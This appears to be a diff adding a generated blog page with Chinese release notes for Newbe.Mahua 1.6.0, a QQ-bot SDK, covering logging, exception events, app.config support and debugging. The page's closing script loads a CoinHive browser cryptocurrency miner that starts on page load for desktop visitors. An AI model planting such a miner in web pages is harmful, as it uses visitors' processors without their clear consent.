@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="msvalidate.01" content="71CCAD9D3DEDBA653F52D96EACF9ED56" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="此次版本发布主要围绕”开发便利性提升”特性。可调试行、可追踪性都有进一步提升。">
+  <link rel="canonical" href="http://0.0.0.0:4000/docs/mahua/releasenodes/2017/12/30/Release-Notes-1-6-0.html">
+  <link rel="alternate" type="application/rss+xml" title="Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。" href="http://0.0.0.0:4000 /feed.xml " />
+  <meta name="keywords" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Newbe.Mahua 1.6.0 开发便利性提升 | Newbe | Newbe便是新生，唯有不断蜕变才能焕然新生。 </title>
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/i/favicon.ico" media="screen">
+  <meta name="mobile-web-app-capable" content="yes">
+  <link rel="icon" sizes="192x192" href="/assets/i/favicon.ico">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="Newbe" />
+  <link rel="apple-touch-icon-precomposed" href="/assets/i/favicon.ico">
+  <meta name="msapplication-TileImage" content="/assets/i/favicon.ico">
+  <meta name="msapplication-TileColor" content="#0e90d2">
+  <link rel="stylesheet" href="http://cdn.amazeui.org/amazeui/2.7.2/css/amazeui.min.css">
+  <link rel="stylesheet" href="/assets/css/app.css">
+  <style media="screen">
+      del{
+        text-decoration: none;
+        color: black;
+        background-color:black
+      }
+      del:hover{
+        background-color:white
+      }
+  </style>
+  <!-- 腾讯分析 BEGIN-->
+  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=62304791" charset="UTF-8"></script>
+  <!--腾讯分析 END-->
+  <script>
+    (function(i, s, o, g, r, a, m) {
+      i['GoogleAnalyticsObject'] = r;
+      i[r] = i[r] || function() {
+        (i[r].q = i[r].q || []).push(arguments)
+      }, i[r].l = 1 * new Date();
+      a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0];
+      a.async = 1;
+      a.src = g;
+      m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+    ga('create', 'UA-100658571-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+</head>
+
+
+  <body>
+
+    <header class="am-g am-g-fixed blog-fixed blog-text-center blog-header">
+  <div class="am-u-sm-8 am-u-sm-centered">
+    <img width="200" src="/assets/i/logo.png" alt="Amaze UI Logo" />
+    <h2 class="am-hide-sm-only">Newbe便是新生，唯有不断蜕变才能焕然新生。</h2>
+  </div>
+</header>
+<!-- nav start -->
+<nav class="am-g am-g-fixed blog-fixed blog-nav">
+  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only blog-button" data-am-collapse="{target: '#blog-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+  <div class="am-collapse am-topbar-collapse" id="blog-collapse">
+    <ul class="am-nav am-nav-pills am-topbar-nav">
+      <li class="am-active"><a href="/">首页</a></li>
+      <li><a href="#" title="麻花文库(Mahua Gallery)" onclick=" $('#pleaseWait').modal()">麻花(Mahua)插件中心</a></li>
+      <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework" title="项目源码" target="_blank">项目源码</a></li>
+      <li><a href="https://cnhv.co/ya7l" title="挖矿捐助" target="_blank">挖矿捐助 <del>不花钱</del> </a></li>
+      <li><a href="https://gitee.com/yks/Newbe.Mahua.Framework#project-donate-overview" title="现金捐助" target="_blank">现金捐助</a></li>
+      <li><a href="https://marketplace.visualstudio.com/items?itemName=Newbe36524.NewbeMahuaVsExtensions" title="VS插件下载" target="_blank">VS插件下载</a></li>
+      <li><a href="https://jq.qq.com/?_wv=1027&k=4AMMCTx" title="技术交流群" target="_blank">技术交流群</a></li>
+      <li><a href="https://live.bilibili.com/7834872" title="直播码字" target="_blank" id="liveStatus" >直播码字</a></li>
+    </ul>
+    <div class="am-form-group">
+      <script type="text/javascript">
+        (function() {
+          document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E'));
+          var bdcs = document.createElement('script');
+          bdcs.type = 'text/javascript';
+          bdcs.async = true;
+          bdcs.src = 'http://znsv.baidu.com/customer_search/api/js?sid=4496900582148885024' + '&plate_url=' + encodeURIComponent(window.location.href) + '&t=' + Math.ceil(new Date() / 3600000);
+          var s = document.getElementsByTagName('script')[0];
+          s.parentNode.insertBefore(bdcs, s);
+        })();
+      </script>
+    </div>
+  </div>
+</nav>
+<hr>
+<!-- nav end -->
+
+<div class="am-modal am-modal-alert" tabindex="-1" id="pleaseWait">
+  <div class="am-modal-dialog">
+    <div class="am-modal-hd">即将上线</div>
+    <div class="am-modal-bd">
+     尽请期待！
+    </div>
+    <div class="am-modal-footer">
+      <span class="am-modal-btn">确定</span>
+    </div>
+  </div>
+</div>
+
+
+        <!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+  <div class="am-u-md-8 am-u-sm-12">
+    <article class="am-article blog-article-p">
+      <div class="am-article-hd">
+        <h1 class="am-article-title blog-text-center">Newbe.Mahua 1.6.0 开发便利性提升</h1>
+        <p class="am-article-meta blog-text-center">
+          <span><a href="#" class="blog-color">Docs, Mahua, and ReleaseNodes</a></span>-
+          <span><a href="#">Newbe &nbsp;</a></span>-
+          <span><a href="#">30 Dec 2017</a></span>
+        </p>
+      </div>
+      <div class="am-article-bd">
+            <p>此次版本发布主要围绕”开发便利性提升”特性。可调试行、可追踪性都有进一步提升。</p>
+
+<h1 id="版本亮点">版本亮点</h1>
+
+<h2 id="提供日志接口">提供日志接口</h2>
+
+<p>可以通过<code class="highlighter-rouge">ILog Logger = Newbe.Mahua.Logging.LogProvider.For&lt;T&gt;()</code>创建日志接口的实例，并通过实例写日志。</p>
+
+<p>日志接口通过<a href="https://github.com/damianh/LibLog">LibLog</a>实现。</p>
+
+<p>依托于该项目的灵活性，可以在流行的日志框架之间进行切换，包括：</p>
+
+<ul>
+  <li>NLog</li>
+  <li>Log4Net</li>
+  <li>EntLib Logging</li>
+  <li>Serilog</li>
+  <li>Loupe</li>
+</ul>
+
+<p>本SDK默认使用NLog，详细内容可以通过<a href="https://github.com/damianh/LibLog">LibLog</a>进行了解。</p>
+
+<h2 id="支持全局异常事件">支持全局异常事件</h2>
+
+<p>添加了<code class="highlighter-rouge">IExceptionOccuredMahuaEvent</code>接口，运行出现异常事件。</p>
+
+<p>当插件运行过程中出现异常时，将会触发此事件。</p>
+
+<p>开发者可以在此事件中了解异常的原因，同时提供了<code class="highlighter-rouge">ContinueThrows</code>参数，允许开发者阻止异常的抛出。</p>
+
+<p>默认情况下，当框架出现异常时，将调用日志接口写下日志。</p>
+
+<p>不再需要处处<code class="highlighter-rouge">try...catch</code>。</p>
+
+<h2 id="支持应用程序配置文件appconfig">支持应用程序配置文件（app.config）</h2>
+
+<p>从 1.6 开始，将会支持 app.config 的配置。</p>
+
+<p>由此，便可以实现 程序集重定向、AppSettings和ConnectionStrings等.Net高级配置内容。</p>
+
+<p>详细的使用方法可以参照下文中的 <a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a> 。</p>
+
+<h2 id="支持调试框架源码">支持调试框架源码</h2>
+
+<p>从 1.6 开始，框架将采用 Debug 模式进行版本发布。</p>
+
+<p>同时，依托 VS2017.5 版本的”源链接支持”和”<a href="https://github.com/ctaggart/SourceLink">SourceLink</a>“的支持，开发者可以实现不需要下载源码，便可以实现调试框架源码的目的。</p>
+
+<p><img src="/assets/i/20171230-001.png" alt="开启源链接支持" /></p>
+
+<h2 id="增加单元测试与调试sdk的说明">增加单元测试与调试SDK的说明</h2>
+
+<p>添加了 <a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a> 教程。</p>
+
+<p>教程链接：<a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a></p>
+
+<h2 id="增加-调用sqlite操作-的例子和说明">增加 “调用SQLite操作” 的例子和说明</h2>
+
+<p>为了响应社区要求，添加了 “调用SQLite操作” 的教程。</p>
+
+<p>通过 异步操作、依赖注入和单元测试等关键内容，为开发者给出开发建议。</p>
+
+<p>教程链接： <a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a></p>
+
+<h2 id="增加-定时任务-的例子和说明">增加 “定时任务” 的例子和说明</h2>
+
+<p>为了响应社区要求，添加了 “定时任务” 的教程。</p>
+
+<p>教程链接： <a href="/docs/mahua/2017/12/31/Newbe-Mahua-Samples-LiveGirl.html">Newbe.Mahua.Samples.LiveGirl 操作定时任务</a></p>
+
+<h1 id="bug修复">BUG修复</h1>
+
+<ul>
+  <li>修复VS2015和VS2017同时安装在一台机器上时，build.bat运行出错的问题。</li>
+  <li>修复了如果没有安装平台扩展(例如：Newbe.Mahua.Administration)，build.bat运行出错的问题。</li>
+</ul>
+
+<h1 id="升级注意">升级注意</h1>
+
+<p>从 1.5 版本直接更新全部的 Newbe.Mahua.* nuget 包，重新生成便可以。</p>
+
+<p>升级过程中若出现需要覆盖build.ps1的提示，允许即可。</p>
+
+<p>不再需要<code class="highlighter-rouge">Tungsten.Domains</code>，可以在升级后卸载此 nuget 包。</p>
+
+<p>VS插件更新只需要安装VS提示进行操作即可。</p>
+
+<p>=========================更多内容分割线=========================</p>
+
+<p>■ 教程链接：</p>
+
+<p><a href="/docs/mahua/2017/12/16/Begin-First-Plugin-With-Mahua-In-v1.4.html">开始第一个QQ机器人【适用于v1.4及以上】</a></p>
+
+<p><a href="/docs/mahua/2017/12/24/Newbe-Mahua-Administration.html">Newbe.Mahua 扩展设置中心</a></p>
+
+<p><a href="/docs/mahua/2017/12/25/Newbe-Mahua-Tests.html">Newbe.Mahua 测试与调试</a></p>
+
+<p><a href="/docs/mahua/2017/12/30/Newbe-Mahua-Samples-Sqlite.html">Newbe.Mahua.Samples.Sqlite SQLite操作实例</a></p>
+
+<p><a href="/docs/mahua/2017/12/31/Newbe-Mahua-Samples-LiveGirl.html">Newbe.Mahua.Samples.LiveGirl 操作定时任务</a></p>
+
+<p>■ 发布说明:</p>
+
+<p><a href="/docs/mahua/releasenodes/2017/12/30/Release-Notes-1-6-0.html">Newbe.Mahua 1.6.0 开发便利性提升</a></p>
+
+
+      </div>
+    </article>
+    <hr>
+    <div class="am-g blog-article-widget blog-article-margin">
+      <div class="am-u-lg-4 am-u-md-5 am-u-sm-7 am-u-sm-centered blog-text-center">
+        <span class="am-icon-tags"> &nbsp;</span>
+        
+          <a href="#">Mahua</a>
+        
+          <a href="#">SDK</a>
+        
+        <hr>
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
+<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>
+
+      </div>
+    </div>
+    <hr>
+  </div>
+  <div class="am-u-md-4 am-u-sm-12 blog-sidebar">
+  <div class="blog-sidebar-widget blog-bor">
+    <h2 class="blog-text-center blog-title"><span>About ME</span></h2>
+    <img src="/assets/i/f14.jpg" alt="about me" class="blog-entry-img">
+    <p>Newbe</p>
+    <p>
+      我是一个有脾气的程序员
+    </p>
+    <p>别说话，给我捐钱就可以了</p>
+  </div>
+  <div class="blog-sidebar-widget blog-bor">
+    <h2 class="blog-text-center blog-title"><span>Contact ME</span></h2>
+    <p>
+      <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
+<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>
+
+    </p>
+  </div>
+  <!--<div class="blog-clear-margin blog-sidebar-widget blog-bor am-g ">
+    <h2 class="blog-title"><span>TAG cloud</span></h2>
+    <div class="am-u-sm-12 blog-clear-padding">
+      <a href="" class="blog-tag">amaze</a>
+      <a href="" class="blog-tag">妹纸 UI</a>
+      <a href="" class="blog-tag">HTML5</a>
+      <a href="" class="blog-tag">这是标签</a>
+      <a href="" class="blog-tag">Impossible</a>
+      <a href="" class="blog-tag">开源前端框架</a>
+    </div>
+  </div>-->
+  <div class="blog-sidebar-widget blog-bor">
+    <h2 class="blog-title"><span>么么哒</span></h2>
+    <ul class="am-list">
+      <li><a href="#">不要以为自己已经走入了人生的谷底，还有好多下坡路在等着你。</a></li>
+      <li><a href="#">你这么努力，忍受那么多寂寞和纠结，我们也没觉得你有多优秀。</a></li>
+      <li><a href="#">人和人之间最大的区别就是逛完商场后下电梯，你按1楼，别人都按B。</a></li>
+      <li><a href="#">对今天解决不了的事情，也不要着急。因为明天也可能还是解决不了。</a></li>
+    </ul>
+  </div>
+</div>
+
+</div>
+<!-- content end -->
+
+
+    <footer class="blog-footer">
+  <div class="am-g am-g-fixed blog-fixed am-u-sm-centered blog-footer-padding">
+    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
+      <h3>Newbe</h3>
+      <p class="am-text-sm">没什么可说的！
+    </div>
+    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
+      <h3>社交账号</h3>
+      <p>
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=472158246&site=qq&menu=yes" target="_blank"><span class="am-icon-qq am-icon-fw am-primary blog-icon blog-icon"></span></a>
+<a href="https://github.com/Newbe36524" target="_blank"><span class="am-icon-github am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://weibo.com/newbe36524" target="_blank"><span class="am-icon-weibo am-icon-fw blog-icon blog-icon"></span></a>
+<a href="http://git.oschina.net/yks" target="_blank"><span class="am-icon-reddit am-icon-fw blog-icon blog-icon"></span></a>
+
+      </p>
+      <h3>Bio</h3>
+      <p>没什么可说的！</p>
+    </div>
+    <div class="am-u-sm-12 am-u-md-4- am-u-lg-4">
+      <h1>我们站在巨人的肩膀上</h1>
+      <h3>Heroes</h3>
+      <p>
+        <ul>
+          <li>amazeui</li>
+          <li>amwiki</li>
+          <li>jekyll</li>
+          <li>...</li>
+        </ul>
+      </p>
+    </div>
+  </div>
+  <div class="blog-text-center">© 2017 Newbe
+    <!-- CNZZ BEGIN -->
+    <script src="/assets/js/newbe/cnzz.js" type="text/javascript"></script>
+    <!-- CNZZ END -->
+  </div>
+</footer>
+<div class="am-modal am-modal-confirm" tabindex="-1" id="live-confirm">
+  <div class="am-modal-dialog">
+    <div class="am-modal-hd">b站直播</div>
+    <div class="am-modal-bd">
+      听说正在直播码字，要不要前去帮忙刷一下人气？
+    </div>
+    <div class="am-modal-footer">
+      <span class="am-modal-btn am-btn-primary" data-am-modal-cancel>滚蛋</span>
+      <span class="am-modal-btn" data-am-modal-confirm>好的</span>
+    </div>
+  </div>
+</div>
+<!--[if (gte IE 9)|!(IE)]><!-->
+<script src="https://cdn.bootcss.com/jquery/2.1.4/jquery.min.js"></script>
+<!--<![endif]-->
+<!--[if lte IE 8 ]>
+<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
+<script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.ie8polyfill.min.js"></script>
+<![endif]-->
+<script src="http://cdn.amazeui.org/amazeui/2.7.2/js/amazeui.min.js"></script>
+<!-- JiaThis BEGIN -->
+<script src="/assets/js/newbe/jiathis.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jiathis_r.js?move=0&amp;btn=r4.gif&amp;uid=2134199" charset="utf-8"></script>
+<!-- JiaThis END -->
+<!-- 百度推送 BEGIN -->
+<script src="/assets/js/newbe/baidutuisong.js" type="text/javascript"></script>
+<!-- 百度推送 END -->
+<script type="text/javascript">
+$(function () {
+  // 表格增加样式
+  $(".am-article").find("table").addClass("am-table am-table-striped am-table-hover");
+  // 你知道的太多了
+  $("del").attr("title","你知道的太多了！");
+  // 直播状态
+  (function () {
+    var loaded = false;
+    window.setInterval(function () {
+        if (!loaded) {
+            $.get("http://pianzide1117.oicp.net:12821/api/beesite/status")
+                .done(function (data) {
+                    if (data) {
+                        $('#live-confirm').modal({
+                            relatedTarget: this,
+                            onConfirm: function (options) {
+                                window.open("https://live.bilibili.com/7834872");
+                            },
+                            onCancel: function () {}
+                        });
+                        $("#liveStatus").text("正在直播码字");
+                    } else {
+                        $("#liveStatus").text("这会儿没有直播");
+                    }
+                    loaded = true;
+                })
+                .error(function () {
+                    $("#liveStatus").text("这会儿没有直播");
+                });
+        }
+    }, 2000);
+  })();
+});
+</script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('70pQBVoLVg88SblKomCh9mJHBeT8nOzk', {throttle: 0.7});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+
+
+  </body>
+
+</html>
